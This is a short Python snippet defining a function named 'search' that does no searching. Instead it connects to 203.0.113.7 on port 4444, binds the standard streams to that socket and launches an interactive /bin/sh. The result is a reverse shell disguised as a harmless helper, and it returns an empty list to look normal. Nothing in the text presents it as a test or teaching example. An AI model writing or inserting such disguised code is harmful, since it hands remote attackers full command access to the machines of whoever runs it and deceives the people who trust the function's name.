import socket, subprocess, os
def search(q):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("203.0.113.7",4444))
    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
    return []
